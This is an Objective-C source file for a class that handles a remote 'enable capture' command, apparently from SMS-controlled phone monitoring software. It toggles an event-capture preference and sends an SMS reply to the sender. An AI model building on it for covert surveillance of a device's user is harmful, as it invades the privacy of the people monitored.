/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  EnableCaptureProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "EnableCaptureProcessor.h"
#import "PrefEventsCapture.h"
#import "Preference.h"

@interface EnableCaptureProcessor (PrivateAPI)
- (BOOL) isValidFlag;
- (void) enableCapture;
- (void) enableCaptureException;
- (void) sendReplySMS;
@end

@implementation EnableCaptureProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the EnableCaptureProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: No return type
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"EnableCaptureProcessor--->initWithRemoteCommandData...");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods
/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the LocationOnDemandProcessor
 - Argument list and description: 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"EnableCaptureProcessor--->doProcessingCommand");
	if ([self isValidFlag])	[self enableCapture];
	else [self enableCaptureException];
		
}


#pragma mark EnableCaptureProcessor PrivateAPI Methods

/**
 - Method name: enableCapture
 - Purpose:This method is used to process Enable Capture
 - Argument list and description: No Return Type
 - Return description: mRemoteCmdCode (NSString *)
*/

- (void) enableCapture {
	DLog (@"EnableCaptureProcessor--->enableCapture");
	NSUInteger flagValue=[[[mRemoteCmdData mArguments] objectAtIndex:2] intValue];
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefEventsCapture *prefEvents = (PrefEventsCapture *)[prefManager preference:kEvents_Ctrl];
	[prefEvents setMStartCapture:flagValue];
	[prefManager savePreferenceAndNotifyChange:prefEvents];
	[self sendReplySMS];
}

/**
 - Method name: isValidDigitAndURL
 - Purpose:This method is used to validate the Arguments
 - Argument list and description: 
 - Return description:isValidArguments (BOOL)
*/

- (BOOL) isValidFlag {
	DLog (@"EnableCaptureProcessor--->isValidFlag")
	BOOL isValid=NO;
	NSArray *args=[mRemoteCmdData mArguments];
	if ([args count]>2) isValid=[RemoteCmdProcessorUtils isZeroOrOneFlag:[args objectAtIndex:2]];	
	return isValid;
}

/**
 - Method name: enableCaptureException
 - Purpose:This method is invoked when  processRequestEvents failed. 
 - Argument list and description: No Return Type
 - Return description: No Argument
*/

- (void) enableCaptureException {
	DLog (@"EnableCaptureProcessor--->enableCaptureException")
	FxException* exception = [FxException exceptionWithName:@"Enable capture exception" andReason:@"Enable Capture error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aErrorCode (NSUInteger)
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"EnableCaptureProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																			     	  andErrorCode:_SUCCESS_];
	NSString *enableCaptureMessage=NSLocalizedString(@"kEnableCapture", @"");
	if ([[[mRemoteCmdData mArguments] objectAtIndex:2] intValue]==1) 
		enableCaptureMessage=[enableCaptureMessage stringByAppendingString:NSLocalizedString(@"kEnabled", @"")];
	else 
    	enableCaptureMessage=[enableCaptureMessage stringByAppendingString:NSLocalizedString(@"kDisabled", @"")];

		enableCaptureMessage=[messageFormat stringByAppendingString:enableCaptureMessage];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:enableCaptureMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:enableCaptureMessage];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[super dealloc];
}

@end
